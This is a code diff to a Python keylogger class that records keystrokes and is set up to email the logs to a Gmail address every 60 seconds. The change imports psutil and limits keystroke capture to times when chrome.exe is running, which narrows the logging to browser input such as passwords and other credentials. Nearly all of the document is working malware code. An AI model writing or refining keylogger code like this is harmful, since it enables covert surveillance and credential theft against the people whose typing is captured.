@@ -3,6 +3,7 @@ import smtplib # for sending email using SMTP protocol (gmail)
 # Timer is to make a method runs after an `interval` amount of time
 from threading import Timer
 from datetime import datetime
+import psutil
 
 SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on
 EMAIL_ADDRESS = "thisisafakegmail@gmail.com"
@@ -24,24 +25,25 @@ class Keylogger:
         This callback is invoked whenever a keyboard event is occured
         (i.e when a key is released in this example)
         """
-        name = event.name
-        if len(name) > 1:
-            # not a character, special key (e.g ctrl, alt, etc.)
-            # uppercase with []
-            if name == "space":
-                # " " instead of "space"
-                name = " "
-            elif name == "enter":
-                # add a new line whenever an ENTER is pressed
-                name = "[ENTER]\n"
-            elif name == "decimal":
-                name = "."
-            else:
-                # replace spaces with underscores
-                name = name.replace(" ", "_")
-                name = f"[{name.upper()}]"
-        # finally, add the key name to our global `self.log` variable
-        self.log += name
+        if "chrome.exe" in (i.name() for i in psutil.process_iter()):
+            name = event.name
+            if len(name) > 1:
+                # not a character, special key (e.g ctrl, alt, etc.)
+                # uppercase with []
+                if name == "space":
+                    # " " instead of "space"
+                    name = " "
+                elif name == "enter":
+                    # add a new line whenever an ENTER is pressed
+                    name = "[ENTER]\n"
+                elif name == "decimal":
+                    name = "."
+                else:
+                    # replace spaces with underscores
+                    name = name.replace(" ", "_")
+                    name = f"[{name.upper()}]"
+            # finally, add the key name to our global `self.log` variable
+            self.log += name
 
     def update_filename(self):
         # construct the filename to be identified by start & end datetimes
